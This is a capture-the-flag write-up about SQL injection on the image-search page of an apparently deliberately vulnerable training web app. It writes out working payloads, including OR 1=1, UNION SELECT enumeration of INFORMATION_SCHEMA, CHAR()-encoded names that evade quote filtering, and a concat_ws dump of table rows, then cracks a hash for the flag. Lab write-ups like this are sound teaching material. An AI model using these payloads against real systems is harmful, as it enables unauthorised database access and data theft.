

in page : http://machineURL/?page=searchimg

you will find an input field search to IMAGE NUMBER:

you can retrieve the image details by intering a number in the input field

one of the ways to detect SQL injection is to submit a quote
```
 ' 
``` 
submiting this quote will return nothing because this input doesn't return the database error, so next we can try OR statement

you can try inputs like 
```
1 OR 1=1 to retrive the whole list of images
```
and that indeed returns all the images which means that we did find a SQL injection

next, we want to retrieve all the tables, we can do that using this query :

```
1 union SELECT null, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```

note: in order for union to succseed we need two conditions :

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

to check for how many columns the original query ruturns, you can test is using ORDER BY clauses and incrementing the specified column index until an error occurs like this :
```
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
etc.
```

getting the output of all the talbles, notice a list_images table, thats our baby

we send another query to the database to get all the column names for the list_images table

```
1 union SELECT null , COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(0x6C, 0x69, 0x73, 0x74, 0x5F, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x73)
```

notice that we have Represented the list_images as CHAR(0x6C, 0x69, 0x73, 0x74, 0x5F, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x73)

that is because whenever we use some kind of quoted input we don't get any output

with that we get all the list_images coulmn names so we can construct a query to get the data of all the list_images

and we do that using this command : 
```
1 union select null, concat_ws(CHAR(124),id, url, title, comment) from list_images
```
that gives us all the column values in the first column (Title) separated by | (char(124))

```
5|borntosec.ddns.net/images.png|Hack me ?|If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

you decrypt 1928e8083cf461a51303633093573c46 and you get albatroz
lowering all the letters and sh256 on it and we get the flag


